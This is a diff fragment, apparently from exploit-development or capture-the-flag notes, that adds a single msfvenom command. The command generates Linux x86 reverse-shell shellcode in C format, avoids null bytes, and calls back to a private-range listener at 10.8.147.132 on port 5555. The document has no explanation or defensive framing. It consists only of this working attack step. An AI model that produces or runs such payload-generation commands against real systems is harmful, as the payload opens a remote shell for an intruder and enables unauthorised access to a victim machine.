@@ -1,0 +1,4 @@
+
+
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.8.147.132 LPORT=5555 -b "\x00" -f c
